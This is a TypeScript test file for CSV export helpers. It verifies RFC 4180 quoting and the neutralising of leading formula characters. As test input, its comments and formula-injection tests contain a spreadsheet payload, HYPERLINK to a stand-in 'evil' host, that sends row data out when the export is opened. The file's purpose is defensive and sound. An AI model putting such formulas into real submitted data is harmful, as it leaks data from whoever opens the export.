import { describe, expect, it } from "vitest";
import { csvCell, csvRow } from "@/features/tables/csv";

// Two properties, and the second is the one that matters.
//
// Record values are attacker-writable with NO credential — anyone can submit a
// public form. A cell that begins `=` is a FORMULA to Excel, Sheets and
// LibreOffice, so `=HYPERLINK("http://evil/?"&A1,"Click")` in a submitted name
// exfiltrates the row the moment a colleague opens the export. RFC-4180 quoting
// does not help: the parser strips quotes before evaluating.

describe("csvCell — RFC 4180", () => {
  it("passes plain values through unquoted", () => {
    expect(csvCell("Acme")).toBe("Acme");
    expect(csvCell(42)).toBe("42");
  });

  it("quotes commas, quotes and newlines, doubling inner quotes", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("renders null/undefined as empty, arrays as a joined list", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(["a", "b"])).toBe('"a, b"');
  });
});

describe("csvCell — formula injection", () => {
  for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
    it(`neutralises a leading ${JSON.stringify(lead)}`, () => {
      const out = csvCell(`${lead}HYPERLINK("http://evil/?"&A1,"x")`);
      // The apostrophe comes FIRST — before any RFC-4180 quoting.
      expect(out.replace(/^"/, "").startsWith("'")).toBe(true);
    });
  }

  it("keeps the original text after the marker — the value stays honest", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
  });

  it("does not touch a value that merely CONTAINS an operator", () => {
    expect(csvCell("a=b")).toBe("a=b");
    expect(csvCell("3-2")).toBe("3-2");
  });

  it("still quotes a neutralised value that also needs quoting", () => {
    expect(csvCell("=a,b")).toBe(`"'=a,b"`);
  });
});

describe("csvRow", () => {
  it("joins with commas and ends CRLF", () => {
    expect(csvRow(["a", "b"])).toBe("a,b\r\n");
  });

  it("neutralises every cell, not just the first", () => {
    expect(csvRow(["ok", "=BAD()"])).toBe("ok,'=BAD()\r\n");
  });
});
